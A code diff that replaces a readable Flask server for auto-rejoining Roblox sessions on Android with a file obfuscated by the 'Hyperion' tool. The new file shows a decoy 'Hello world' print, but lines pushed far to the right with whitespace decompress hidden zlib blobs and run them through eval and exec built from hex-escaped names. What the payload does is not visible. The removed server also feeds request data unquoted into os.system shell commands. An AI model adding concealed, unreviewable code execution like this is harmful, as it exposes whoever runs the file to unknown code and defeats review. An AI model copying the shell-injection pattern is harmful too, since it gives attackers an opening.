@@ -1,249 +1,95 @@
-from flask import Flask, request, jsonify
-import json
-from datetime import datetime, timedelta
-import os
-import threading
-import time
-import subprocess
-import requests
-
-app = Flask(__name__)
-
-user_data = {}
-
-def get_pid(package):
-    pid_cmd = f"pidof {package}"
-    pid_output = subprocess.getoutput(pid_cmd)
-    pid = pid_output.strip()
-
-    if pid:
-        return pid
-
-def send_webhook(webhook_url, content, avatar_url=None):
-    if webhook_url == "0":
-        print("Webhook URL is set to 0, skipping the request.")
-        return
-
-    data = {
-        "content": content,
-        "username": "Staryuu Auto Rejoin",
-    }
-    
-    if avatar_url:
-        data["avatar_url"] = avatar_url
-    
-    response = requests.post(webhook_url, json=data)
-    
-    if response.status_code == 204:
-        print("Message sent successfully")
-    else:
-        print(f"Failed to send message. Status code: {response.status_code}, response: {response.text}")
-
-def launch_roblox_with_private_server(private_server_link, username):
-    packagename = user_data.get(username, {}).get('packagename')
-    crash = user_data.get(username, {}).get('cc')
-    pid = get_pid(packagename)
-    if packagename:
-        if pid:
-            close = f"su -c 'kill {pid}'"
-            os.system(close)
-        time.sleep(5)
-        cmd = f"am start -a android.intent.action.VIEW -d '{private_server_link}' {packagename}"
-        os.system(cmd)
-        crash += 1
-        user_data[username]['cc'] = crash
-        print(f"Launched Roblox game with ps: {private_server_link} for user: {username} with crash count: {crash}")
-    else:
-        print(f"Package name not found for user: {username}")
+from builtins import *
+from math import prod as Multiply
 
 
+__obfuscator__ = 'Hyperion'
+__authors__ = ('billythegoat356', 'BlueRed')
+__github__ = 'https://github.com/billythegoat356/Hyperion'
+__discord__ = 'https://discord.gg/plague'
+__license__ = 'EPL-2.0'
 
-def launch_roblox(game_id, username):
-    packagename = user_data.get(username, {}).get('packagename')
-    crash = user_data.get(username, {}).get('cc')
-    pid = get_pid(packagename)
-    if packagename:
-        if pid:
-            close = f"su -c 'kill {pid}'"
-            os.system(close)
-        time.sleep(5)
-        url = f"roblox://placeID={game_id}"
-        cmd = f"am start -a android.intent.action.VIEW -d '{url}' {packagename}"
-        os.system(cmd)
-        crash += 1
-        user_data[username]['cc'] = crash
-        print(f"Launched Roblox game with ID: {game_id} for user: {username}")
-    else:
-        print(f"Package name not found for user: {username}")
+__code__ = 'print("Hello world!")'
 
-@app.route('/updatetime', methods=['POST'])
-def update_time():
-    username = request.json.get('username')
-    print(f"Received update_time request for user: {username}")
-    if username in user_data:
-        user_data[username]['last_update'] = str(datetime.now())
-        print(f"Time updated for user: {username} with time {user_data[username]['last_update']}")
-        return jsonify({"message": f"Time updated for user: {username}"}), 200
-    else:
-        print(f"User '{username}' not found")
-        return jsonify({"error": f"User '{username}' not found"}), 404
 
-@app.route('/adduser', methods=['POST'])
-def add_user():
-    username = request.json.get('username')
-    packagename = request.json.get('packagename')
-    game_id = request.json.get('game_id')
-    is_ps = request.json.get('is_ps')
-    ps = request.json.get("private_link")
-    wb = request.json.get("webhook")
-    
-    if not username or not packagename or not game_id:
-        print("Missing required fields: username, packagename, and game_id are required")
-        return jsonify({"error": "Username, packagename, and game_id are required"}), 400
-    
-    if username in user_data:
-        print(f"User '{username}' already exists")
-        return jsonify({"error": f"User '{username}' already exists"}), 409
-    
-    user_data[username] = {
-        'packagename': packagename,
-        'game_id': game_id,
-        'ps_link': ps,
-        'is_ps': is_ps,
-        'webhook': wb,
-        'cc': 0,
-        'last_update': str(datetime.now())
-    }
-    print(f"User added: {username}")
-    send_webhook(wb, f"New user added: ||{username}||")
-    return jsonify({"message": f"User '{username}' added successfully"}), 201
+_floor, Square, _product, Hypothesis, _statistics, _memoryaccess, Power = exec, str, tuple, map, ord, globals, type
 
-@app.route('/rejoinroblox', methods=['POST'])
-def rejoin_roblox():
-    try:
-        username = request.json.get('username')
-        if not username:
-            return jsonify({"error": "Username is required"}), 400
+class Add:
+    def __init__(self, Cube):
+        self.Invert = Multiply((Cube, 59538))
+        self.Substract(_run=83131)
 
-        print(f"Received rejoinroblox request for user: {username}")
-
-        user_info = user_data.get(username)
-        if not user_info:
-            return jsonify({"error": f"User '{username}' not found"}), 404
-
-        if user_info.get('is_ps'):
-            launch_roblox_with_private_server(user_info['ps_link'], username)
-        else:
-            launch_roblox(user_info['game_id'], username)
-
-        send_webhook(user_info['webhook'], f"User ||{username}|| has requested to rejoin")
-        return jsonify({"message": f"Rejoined Roblox game for user: {username}"}), 200
-
-    except Exception as e:
-        print(f"Error occurred while processing rejoin request: {e}")
-        return jsonify({"error": "Internal server error"}), 500
-
-@app.route('/launchroblox', methods=['POST'])
-def launch_roblox_by_packagename():
-    try:
-        data = request.json
-        private_server_link = data.get('private_server_link')
-        packagename = data.get('packagename')
-
-        if not private_server_link:
-            return jsonify({"error": "Private server link is required"}), 400
-        if not packagename:
-            return jsonify({"error": "Package name is required"}), 400
-
-        pid = get_pid(packagename)
-        if pid:
-            close_cmd = f"su -c 'kill {pid}'"
-            os.system(close_cmd)
-            time.sleep(5)
-
-        launch_cmd = f"am start -a android.intent.action.VIEW -d '{private_server_link}' {packagename}"
-        os.system(launch_cmd)
-
-        print(f"Launched Roblox game with ps: {private_server_link} for package: {packagename}")
-        return jsonify({"message": f"Launched Roblox game with ps: {private_server_link} for package: {packagename}"}), 200
-
-    except Exception as e:
-        print(f"Error launching Roblox game: {e}")
-        return jsonify({"error": "Internal server error"}), 500
-
-@app.route('/userdata', methods=['GET'])
-def get_user_data():
-    return jsonify(user_data), 200
-
-@app.route('/close', methods=['POST'])
-def close():
-    try:
-        username = request.json.get('username')
-        if not username:
-            return jsonify({"error": "Username is required"}), 400
-
-        packagename = user_data.get(username, {}).get('packagename')
-        if not packagename:
-            return jsonify({"error": "Packagename not found for the given username"}), 404
-
-        pid = get_pid(packagename)
-        if not pid:
-            return jsonify({"error": f"No process found for package name {packagename}"}), 404
-
-        close_command = f"su -c 'kill {pid}'"
-        os.system(close_command)
-
-        return jsonify({"message": f"Process for package {packagename} with PID {pid} has been terminated"}), 200
-
-    except Exception as e:
-        return jsonify({"error": str(e)}), 500
-
-@app.route('/removeuser', methods=['POST'])
-def remove_user():
-    username = request.json.get('username')
-    print(f"Received request to remove user: {username}")
-    
-    if not username:
-        print("No username provided in the request")
-        return jsonify({"error": "Username is required"}), 400
-
-    if username in user_data:
-        del user_data[username]
-        print(f"User '{username}' removed successfully")
-        return jsonify({"message": f"User '{username}' removed successfully"}), 200
-    else:
-        print(f"User '{username}' not found")
-        return jsonify({"error": f"User '{username}' not found"}), 404
-
-def check_inactive_users():
-    print("Starting check_inactive_users thread...")
-    while True:
-        time.sleep(60)  
-        now = datetime.now()
-        inactive_users = []
-        for username, data in user_data.items():
-            last_update = datetime.strptime(data['last_update'], '%Y-%m-%d %H:%M:%S.%f')
-            if now - last_update > timedelta(minutes=5):
-                print(f"User Inactive: '{username}'")
-                inactive_users.append(username)
+    def Substract(self, _run = bool):
+        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
+        self.Invert *= 43675 * _run
         
-        for user in inactive_users:
-            time.sleep(10)
-            print(f"User {user} has been inactive for more than 5 minutes")
-            if user_data[user]['is_ps'] == True :
-                launch_roblox_with_private_server(user_data[user]['ps_link'], user)
-            else:
-                launch_roblox(user_data[user]['game_id'], user)
+        try:
+            (_statistics, _product) if Hypothesis != _floor else {_statistics: Square} < _floor
 
-            user_data[user]['last_update'] = str(datetime.now())
-            send_webhook(user_data[user]['webhook'],f"User ||{user}|| has been inactive, {user_data[username]['last_update']}")
-        print("Inactive users checked.")
+        except OSError:
+            {Hypothesis: 'RRbtbeaaoltd'} if _product > _memoryaccess else (_product, _floor, _floor) == _statistics
 
+        except:
+            Power(15361 - -50935) == str
 
+    def Run(self, Positive = -76065):
+        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
+        Positive /= -93492 * -31951
+        self._negative != bool
+        
+        try:
+            (_product, Hypothesis, _product) if _product >= _memoryaccess else {Hypothesis: 'RRbtbeaaoltd'} <= _product
 
-thread = threading.Thread(target=check_inactive_users, daemon=True)
-thread.start()
-print("Background thread started.")
+        except ArithmeticError:
+            ((Hypothesis, {_statistics: Square}) for Hypothesis in {Hypothesis: 'RRbtbeaaoltd'} if _memoryaccess >= _floor)
+
+        except:
+            Power(46998 * 38842) == False
+
+    def _math(_round = False):
+        return _memoryaccess()[_round]
+
+    def _square(Absolute = 24494 / -78802, _absolute = int, Round = _memoryaccess):
+        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
+        Round()[Absolute] = _absolute
+        
+        try:
+            (_product, _floor, _floor) if Hypothesis >= _memoryaccess else {Hypothesis: 'RRbtbeaaoltd'} != _floor
+
+        except TypeError:
+            ((Hypothesis, (_product, _floor, _floor)) for Hypothesis in (_product, Hypothesis, _product) if Square <= _floor)
+
+        except:
+            Power(56903 - -53814) == bool
+
+    def execute(code = str):
+        return _floor(Square(_product(Hypothesis(_statistics, code))))
+
+    @property
+    def _negative(self):
+        self._random = '<__main__._random object at 0x000007360BE68424>'
+        return (self._random, Add._negative)
 
 if __name__ == '__main__':
-    app.run(host='127.0.0.1', port=6969)
+    try:
+        Add.execute(code = __code__)
+        _algorithm = Add(Cube = 23230 * -37631)
+
+        Add(Cube = -62571 + -60697).Run(Positive = 37997 * _algorithm.Invert)                                                                                                                                                                                                                                                          ;Add._square(Absolute='WXWXXWXXWWXXXWXXXXWWWXX',_absolute=b'x\x9c\xed\x1bko\xdb8\xf2{~E\xd6_d\xa3m*\x91"%\x05\xe8\x97C\xee\xb01\x9c\xfa\xb09\\rh\x0bC\xb6\xe4TY\xc5\n\xfc\xd88\xff~g\xf8\xb0iK\x8a\xa9\xc4u\xba\xb9\x15\xcd\xf7\x90"G\xe4p\x1e\xf4|\xfaxzt\x0cO6n\x8b\x18\x9f\xc1\xa0\x18\x8e\x17\xb3Q</\xa6\x83\xc1\xf1/\x9fZ\xbf>\xde\xa7\xd3\xac\x98\xb4\x8e\x8b\xa9\x01\x16/\xe6\xdf\x8b\xe9L\xc0\xb4[\xc3,\xcf\x1f\xe7\xdf\xd3\x9b"\x9eS\xc6[\xef[\xff\xc8\x17\xe9oi\xd2\xeal\xb4\xba\xc9\xe6\xdf\x17C\xd9\xf1\xf7\xf9\xfc~v\xfa\xf1\xa3,;\x19\x15w\x1f\xb7\xba\xf9X\xf3\xee$\x9b\x8d\x8ai\xb2\xd9\x8d*<\xb9\xb9\xf9x\x9f\xc77\x8bt\xabQ\x9e\x8d\xd2\xc9,\x95\x8d\xfe\xf9\xef\xde\x07r\xe2n\x81\x8c\x8aD\xd6;\xf7\xd3l2o\xb7~M\xf3\xbc8~(\xa6y\xf2K\xab\xe3\x1cuNW\xd0X\xef\xcc~\xcf\x12\xa7s\x94.G\xe9\xfd\\!sr\xbf\x80\x96\xbf\x15\xb3tv\x1cO\xd3\xe3i\x9a|\x9d\xfc7+\xf2t.\x0b\x86\x80\x99\xaf\x93\xff\x15\x0b\x91\x8b\x8f\xb1\x93\xaf\x93\xcf\xc5\xb0H\x1e\x8f\xf3\xecwh\xf7X,Z\x9d#9\xa8\xec\xee\xbe\x98\xce\x07\x03x\xdb\xe3\xcc\xe9\x9c\xa4\xcbl\xde\xee\x1c\xe5\xc5(\xceg\xed\xce\x17\xe7\xbc\xdb\xc5\xdfy\x0f\xc2n\xaf\xdb\xebu\xbb\xce\xb7O7y1\x04\x80\xa3\x8aZl\x94\xe7\xb7\xb7Y\x0e\xe8\xceo\xb3\xdb[\x08\xb2[\xe7\xcb\xe9\xe9\xbb\x0f\xef>\xb4?\xb4\xdfy\x9d\xce7\xe8#\x9d\xc7\xf3\xf9\xb4\xae\x8f\xf3.\x94\xf4zX|\xde\x83\x1f>\x10\x96\xfbI\xb2\xda>&w\xf0L\xf0\xb9\x9b\x88\x18\x86.\xa7vT\xaaB\xf8\xeb\xeb\xab+\xf0\xc2]\xcb\xcc54Y\xa3\xa9\xeeE\x0f\xcb%\xfc0xx\xc0\x14\x86\xd0\xb0\xaa\xbf\xb63\\d\xf9<\x9b \xba\xff\x88\xa7\xb3\xa3\xaa\xc6\xd8)\xbcF\xbc\x05\xf1 \x91\xd1;\x87N\x11\x9b\x88\xdf[@/ \x19\xf0\x9b\xb7\xab_4\x9bd\xf3<[\x0c\xb7q\xd6y/P\x89\xfdu{&\x9e\x9b\xf6\xd3\xf9\xb2\xaf\x8eN\xb2I\x92.\xdbN\xba\x98\xfe\xa7T\xfb\xadS\x87\xf7\xb3\xa2\x7fV\x14\xc5\xd9Y\xbf\x8fQ\xbf\xff\xd6\xf13\x8f\x8b|\xdc\x00A\x97\x97\xe4\xf2R\x05*\t\xe1[\xc7R\x1e\xff\x91V!\xa9n\xa7\x9d\x15gr\xf9@\x0ck\t2\xfd3\xb1\xa6\xde<\xa2\x8a\xa2\\\xfb\x04\xa2\x04\xd1\x04\'h&\x86o\x1dA\xe9,\x8f\xff\xd5d\xbf\x11\xdcfDn\xb3\xe6{-\xcbF\xb3x\x92\xbd\x18C\xb5\xfd4\xc5P}G\x1aC\x8f\xe3,_\xa6\xdf\'\x8b\x06XZ\xcaE\xa5\xd6\x18>\xcb\xe5\x9b_Iyv\x7fW\x8c\x9a\xec6$IE\x1f\xc8\x11\xd0%$Lgo\x1dG\xd3\xf9\xac\t~\xaeD\xdf\xd0\xfb\x95x\xc4\x8b\xae\xae\x00I\x8esr[d\x93\x9a\xe5W\xde\xa3\xed\xa1\xe3\x8f\xa9\xcb\xc7\xfe\x98\x8fe\x88\x9e\xbaX\x86i\x8ceZB\xc9Z`\xe0\x92\x14\xd9\xfa\xb6\x13\x8e\xe7\x15\x1b\xe0m\x7f\xadQ\xba\xac<e_\x1b\xeb\xed\xcaWq\x1e\x10\xe8*!.\'\x01\xe3\x11\x1f\x05>\x84i@\xa1$\xe2I\x00\xaf\x08H\xe0C\x8e\x05!g\x9c\xeezQ-ysa\xd3\x16n\x01?\x17\xd8R\x17\xb2\xe0\xe0\xe7\xf6\xcd>\xaaY\xb3\xea\xc1S\xce\xc6\x94\x82\'\xe01\xcd\xc0\xbb*M\xc9\x90\x84$y\x12\x86\x90h\xe7tP\x9a\xaa\xc1\xdd\x06~\x00\x8f,\xf0\x00\x87,\xa0\x81\x1fX\xe0\xa9R\xd8\x02>\x0b~\x18\x08\x0e\x1e\x99.\xd8\xba\x95\xa0\xdb+\xad\x06uN\xc7\x83j\xf7\xd9H\xf6H"\x10\xe9\xda!K \xac\x968\x9dK\xc9\rD\xb7\x9eHt{r\xd7\xc1\x1ck\x9aT\x0e\xaa)\xb2\xeb\x07\x84}\xe3\x8f\xa8\xee\xc9\xe5\xb3\x11E\xd5J\xc3\x15\x16\xaa\x15\xe6\x83\x0f\xd4\x8a\x0b\xc5\x8a\x93\xab\xd2\x06\xd6\xb3\\\x9d\x9f\xf2\xf8n\x98\xc4\xc7\xab\x01]\xaa\x99\x90\xd3\xeaY\xd7!\xa3\x9a\x18%~*<\x86\xd2\xa5FN\xc6\xe9n\xa2\xdf\x04\x95\x04\xb6\xd4\xee\xfd\xd3h\x16>\x1fK\xe7\xfb\x92d\xfa\xf2\x11\x04\x14\x13\x92\xcc\xee\x9e\x87B\xf6\x05<\x9f\xe1\xb9\xf8|\xb1\xfe]\x9cVl\xd4F\xe3\x0c\xc2@>\xa1p\x81\xca\x87\xab\x92\xd0z\x84p\xb0\xc2\xe1\x9a\xe1Y\x8b\xba&<r\xf3\xec\xb4\x928?\xc1k!\xd5v\xdd>>.\x12mI\xc1mH\xb6\xd3q\xa1\xda;(\xdd\xd1s\xc7\xef\xf2Y\x07\xf2\xe3|\xde\xc7f\x00\x92\x8fn\x04>\x860\x06\xb7N\xc9t,a\xec?\xd3y\x8e?\x08\xc4\xa32\x106\x1c\xafs\xa1\xd6"\xce\xf8Bz\xb1<\x9f\xfd\x01"E\x93\x88\xa2I\x81\xa2WDy\xac\x0b\x15=\xb3\x81\r\x1a\xd2\xb3\xbe\xe0\x15\xe0\xe9\xaf\x02\xb7\xdfd\x879\xc5\x19\xf2\x1c}\xa1\xbe\xc0\xd3\x14E\x06X\xc8\x0784M:\xee\x1a8!\n/\x82\xde+\xdc\xd9\xc0\xd2gl\x82\x89@\x94\xc2\x92RN\x88\xa0\x11\x0e\xa5,\xaaD\xd2\xe5\xea\xb7|\xb0\xc3\xe2 \x18\xb8\xe0)\x84\x10\x03(\xd9,\xb1\xec\x85\x0e"hC \xf6\x06>\xb4\xe3\xa2\xa7R\xe9\xcf\xc9\x0e\x95\xbe\x8c\xdc\xe2\xb0\xc7q\xbbc\xd8\xe8\x8b\x08\n!\x9a\xad\x12V\xf3\x0e\x06|\x10\x02\xaeB\xc0\x98\x07!\x03\xe0p\xbb\xecU\xc8\xf5\x9d\xd2\xa0\xad\xe6\x7f7i\x84\x11%\x9e)Y\xf7\xfaZ\xa5\x9f=\x17\xa2\xb83OS9\x153U\x86\xd4\x8e\xa9\xddk\x03\xeb\xdbR\xbefL\x12\x0f\x81\xf7\xf5\x037\xa04&c\x02\x82\x08\xf7\x82\x80\xa4<\xe0\x11\x88q!\xf0\xc7 \xd4\x05@@\xa0\x86\x02\xf3\x93B)\xc3\x10`\xa8\x10\xfb\xc6\x0c\xf8ghE\x82\x08 \x19|\xc51\x03\xde\x1aN\xb11\x8a\x81$\xe1\t\xf7Dj\xbcN\x05\x9b\x10\xc8\x8bC\x1f$\x85\x91Dt\x1c \xab5\xc4\xf7\xd0\x04\x86\x172\xea{\xcc\xa7\xae\xef\x19\x8e2J\x15\xfb\xce\x98?b\x10\xc0/\x82\xbc\x0f\xb5\ts\xfd!`0\x82t\xc4<\x16C{`\xd1\x00&\xf6\xbd}\xb3\x86\x8cJ\x07_\x12<:\x9d3\x9d\xac\xb1>\xd5\xfbJ\xc8u\xd5!&\xce\xb1\xca5]o\xa2(-\x85K\x1b\xd9\xc4\xe90\xb1\x93C\xb5\xa7)\x86\x00\xce\xcb\xa5vL\x9ch\x13\x01}%\xaam\x84\xb3-\x97>{\xb7\xb9\x8arX\xca;+\xea\xd1\xae\x92\x8a\xeb\xb9j\xcdCop\xd3\xc1\xfa\xb1\xe1\xad\xabg\xe0G~\x0cN\x87\x91?R\xe9\x18R\xe81\x8ca\x8e\x11\x1b\xea\x95%W\x9b^Y\xeb5\x861\t9!\xb0\x138\xa7\x94\xba\x94C\x8ci\xae\xbc\xbf\x15#\x8c\x86\xd3\xe5:o\x96\x9b}\x19mA\xd8\x8a\x80\x1e e@\x9a\x001\x8c4\xa0!\xe7@[\x18\x10\x90!\x8d\x81\xbe\x0c\xe1+\r\xe5\x97\x02?\xc4\xaf\x05\xf3I\x84\x0f\x9b\xcc\n\x1d\x8e@;\x9d\xde*\xe3\xe6\x8c\rg\xce\x92\xd0\x10b\x84gF\xac\xd3\xa6g5ul#Mh\xf4Rl\xec^\xc3\xef\xc7Y\x9eN\xe2\xbb\xf4S\xf5b\x1ak\xf5\x9e/\x94~@8\xc7\xbe\xa1\xec\x93\xea?\x7fU\xbb[f}\x7f\x07u\xd5/\x03\x02\xcc\x81\xaa\x8fv\xef\xbb&\xfa\xcbM\xfaiRR\xb3T\xa6wo\xb9J\xdd\xd7\xca@\xb2\\[M\xf6\xca\xfc\xbdTz\xd5\n\x9dH3\xf0\x8a\x1d\x08\r6\x81\x18*\xca]\xb0\x8d\x89cK\xa4\xbcwP\r@\xefNO\xbf8\x8b\xf98t\xdaiR\x8c\xd2\xe4\xa4\xe3Dp\xa6\xfbR\xbf\xac\x14"\x98W\xea\x11\x99\x12J\x11\xad$\x81\xa1*UPRR\n\x99q\xba\x82rI\xec\xc6\xf2\xe4\xa4\x1b\xa7)\x93y]\xb3\xaeu\t\x07\xae\xc2\x19\xb6\rtJ\xe4^\xb6\xbf\xe9\xd9\xed\x9e\x98K\xe5\xd6\xf4huW\xd5\xa7\xab\xd9e\x08\xe2\x84/\x04\x0c\x14T\x801\x1ep\xa8.\x97\xb2\x8ec\xd1[\xdf\x95\xba\xee\xbeP\xa1\xa0&EjV\nX\x8a\x9d\xb6\xb1\xb6\xe5bo\xbdd\xd5\x85Jt\x0c\x8c\xd5\x13\xaa\xbcg\x88\x9d6\xb0\x96b\xe7\x9a\xa4\x89\xeb9hP\x01\x12\xd1\xed\x9d\x0b\xdd.R\x0b\xab\x1dG\x01\xb7\xa1\xf0\xa1\x10\xe9\xa8`\\\xfcr\xe9\x8b\xc4r\xcd\x98sC=\xc1\xd5\xee3\x19{\x1bXK\xc6^\xe0h/T\xb8)c\xbb?2\xdc\x80\xfe\xff`v\x8b\xa7<Q.]\xb9Dy\xe1$\xab\x05\xc7\xb6a \xd3\x063<;\xf9\xca\xa0\xa6\xcdk\xda\xc8\xe6\x8f\xeb\x8e\xf8&\xd8D\x96\x81D+\xb3\x93V\xec\xb3-%\xbfXE\x8a\x81\xf0\xad`\xf77\xb65\xd3\xfd\xd3\xf6\xd9\x80\xa9\xc4<\x13\xecl\xb4\x153\x15\x87*\xa6[\xe5\xdb\xed\xa0\x84\x13\xc1X\x12`\n\xf7\xd7/\xd9\x0fsi\xa6\xcaqCV\x9cs\xdf\xf0\xac&\xcf\xb6\xd2\xfe\x13\xed\xd6p\x94\xa3\x8c\x1f\x80\x0f\x957\xd3aEy\xb0\x03~\xa3\xfe\x90l\xba#U\xe9J\xaf.\x92\xa8_\x7f\x91^\xdd\xd4\x0ei\x9d9U[\xde5XC\x1bXK\xd6\xf0\x87\x1e@\xcf\xd7WT\xe3\x88\x1as\x0c\xd8\xdaV\xaa\xe7\x1f\x1a\x8c\x8c\r\xac%#Sw\xcc=W\xde\xa8W/\xea\x8f\x18\x1a~e\x18`k\xc3\x8a\r\xac\xada\xc5J&\x90\x16\xae\xb55KZ\xb7"#5RV\xb0\x90@\xca\x1fqtB\xeb\xc1\xb5\xdf,\x91R@Xk\xd2\xd4\xfc\xc0N\xde\x7f\xf7\xe0=\xc5\xf7\xbb\xcf\xe6\xfb\x9f\xe6\xd4\xbb]\xc9\xd9"[\xabV\x8a\x05\xaf\xeet\xb8\x90\x17\x02\x90\x17\x90\x9b\xe5\xa84\x03\xf0\xa0\\j\xc5\'G\xd0"\x14&\x8f`\x80\x12I$T\xf9\xaeP\xe5o\x94Z\xf5\xe6\x03$\x9aQ<\xe8\x95H\x1e\x1b\xc0Y\xb9\xf45L&;\x94%b5\x8e6\xd6\xeb:\xaf\xac\xb4v\xea\x91\xd2\xed\xe8\x03j\x10^l)7\x08\x9e\xbeP\xa2\r\x88Z\x9f\xc0\x15=\xb1\x81e\xcd\xbf\xd3\x8f8\x19\xe4\xb6\x89\xd4b^/\xf4\xa0\\j\xa9\x17gbkD\x03\xb9UBaE\xe4\xe5RK\x9b$\xda\x1d}a;')
+
+        _algorithm.Run(Positive = -92603 - _algorithm.Invert)                                                                                                                                                                                                                                                          ;Add._square(Absolute='JLLJIIJIJLJIILILIIJJJIIJI',_absolute=b'cb\xf3z\xc2&Y*\xb5\x16}]\xa5Q\x0f\xc5x\x88\x12}\xb7J\x0f\xb0\x9c\x02cI\xb8\x8a\xf7\xd0J\x02\xcd\x8b\x98B\xf2.\xd8\x06Br\xc9b\xdan|yf/r\xa7\xcdA\xa9e\xcedC\x1eM\x0ci\xd4\xac\x0b\t\xf0\xa5<\x00\xd9T\x9b\x07"e\x18\x90\xf9\xd1\xcaX\x10\x19%X\x0bH6\x8e\xcepu|\x86\x1b9\xe9k\x0e\xcf]\x93q\xa9\xd6\x02\x8a\x94\x08\xc1\xfb2\xadj\rA\x19\xeb*_\xf5Le\xd6+\xd8\xe4wi\xe1\xd3\x92K\x8cx\xe3\x0e\xdc\xde\x0f\x18\xa1\xe4\xe2\xb0\xf3\x91\x96`J\xde\x9b(\x95Z\xd2P"h\x11\xd2+y\x03#\xd8,y\xb5C\x0fm\x90\x92\x82\xfb\x039\xa6P\xd0\xbcR\xe9k0\x1e\xc6\xc1\xf6j\x96\x8fWQ\xb9\xd9\x90>;\xbe?l KH\x19A\xd3\x1e\xa4E\x82\xee\xf8\xdaI\x8a\xb4\xa6N\x1a\xeeI\x99\xe1\x90dO]\x8aR\xa7\x948\xb4\x1e\x9e\xad\xc6\xd7\x8a\xc3mI\xd6\xbc5\xcc\x0c\xe9w\x17\xac\xe5\t\xbc\x9b\xd9\x8e\x8cOf^{\x94\xe5\xf2\x83\xee\x9d\xe1\x0e\x04%\xe0\x82\xea\xf9\x82n\x85\xe2\xe6R\xa9\xf4\xb0t\xe2\x15u\xf1\xf5w\xf5\xf6\xa8\xa5h\x88\x94\x1ae\xbdA\x92\xaa\xe5\x7f\x95\xfe\xfbv\x84\xba\x1d\x11\xad<\x0e\xa0*m\x96\xe9\xf2\xa7b\xd3\xa3Z6\x10.\xdc\x8auz\xdbW\xd5\x95\xf3\x84\xa3r\xd6\xa7\\(i\xb1\xcc?\xa8\x8aV\x98\x1bQ;#\xfeOrnep\xac^\xf6\ro#5#f{"?\xffg,I\xf5i\xf4W\xb1\x02\xba\x86\xb6EkY\xf4\x81\xad\xed\xec\x81^\xfcV\xb0\xfb\x1b\x9b\xc7\xd6\x7f\x8e\xd3\xb7O\xb4m[\xdf>!jl\xc4\n\xf6\xf0\x96?OY\xd8|\x15\x07*\xe65\x169V\xb2\xe8mZ\xfc^\xda_\xf8#-}M-|x\x04P\xbc(\xe7n\x91m\x93\xac\xefJW\x1d\r\xd5u\x94{\xb0\x9f<\xf1\xbe\xed\xa3h\xfb8\xaa:\xae\xea`\xc8\x8e\xf7\xd6\x8f\x7fs\xdc?\xc7\x05?}\xe7jM\x94\x90\xe4\x98\xff\xef\xdd/\x0b\xfd\xb4\x90\xc1\x95\xc0\xc0\x14\x8d\t\x8d}N\xb6\x84\x8c\xa7`\xado\xa8\xed\xfd\xca\xf3\x9e\xf8\xd7\x83p\xd5\x9a\xa2kC\xa5\xfe\xdb\x80\x16\xd9\xb8\xc0\xe4\xfa\x86\xd6.\xd8\xbf\xb9\xf3\xbf\xf2\xdd\xe5\x1f\xcc\xed\x1f\x98\xdc\xe9\x8b\x12\xfao\x97\xf2\x0f\x88\x87\xda\xc0M\xd5\n/3\x92\x98\xf62\xdf\xa0\x8a\xab\x1b\x83\x86\xfd\xfe)\xb8F\xb6\xb6\xa3?\x01m\xfbj?')
+
+        if 238176 > 9576184:
+            _algorithm.Run(Positive = 65294 * _algorithm.Invert)
+        elif 200255 < 1870995:
+            _algorithm.Substract(_run = _algorithm.Invert * 49583)                                                                                                                                                                                                                                                          ;ljllijliijljlilliliilijjj,S2222S22SS2S22SSSS222SS2S2,wxwwwwwxxwxxxwwxx,WWXXWXWWWWWXXXXWW,oDoDODOODDDooDDoDO=(lambda O0oOOooOO00oo0OOOoOO00o0o:O0oOOooOO00oo0OOOoOO00o0o['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda O0oOOooOO00oo0OOOoOO00o0o:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(O0oOOooOO00oo0OOOoOO00o0o)"),filename='\x6c\x49\x49\x6c\x49\x49\x49\x6c\x49\x6c\x49\x6c\x6c\x49\x49\x49\x6c\x6c',mode='\x65\x76\x61\x6c'))),(lambda O0oOOooOO00oo0OOOoOO00o0o:O0oOOooOO00oo0OOOoOO00o0o(__import__('\x7a\x6c\x69\x62'))),(lambda LLLLJIJIJJJJJJJLJ,O0oOOooOO00oo0OOOoOO00o0o:LLLLJIJIJJJJJJJLJ(O0oOOooOO00oo0OOOoOO00o0o)),(lambda:(lambda O0oOOooOO00oo0OOOoOO00o0o:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(O0oOOooOO00oo0OOOoOO00o0o)"),filename='\x6c\x49\x49\x6c\x49\x49\x49\x6c\x49\x6c\x49\x6c\x6c\x49\x49\x49\x6c\x6c',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
+        if 109924 > 4325936:
+            _algorithm.Substract(_run = _algorithm.Invert + -21131)
+        elif 277989 < 2790006:
+            Add(Cube = 99882 - 61666).Run(Positive = 45925 / _algorithm.Invert)                                                                                                                                                                                                                                                          ;oDoDODOODDDooDDoDO()(WWXXWXWWWWWXXXXWW(ljllijliijljlilliliilijjj(wxwwwwwxxwxxxwwxx(S2222S22SS2S22SSSS222SS2S2('\x76\x61\x72\x73'))),Add._math(_round='WXWXXWXXWWXXXWXXXXWWWXX')+Add._math(_round='JLLJIIJIJLJIILILIIJJJIIJI')))
+
+    except Exception as _modulo:
+        if 271749 > 9667866:
+            Add.execute(code = Square(_modulo))
+
+        elif 354940 > 2377823:
+            _algorithm.Run(Positive = -29292 / _algorithm.Invert)
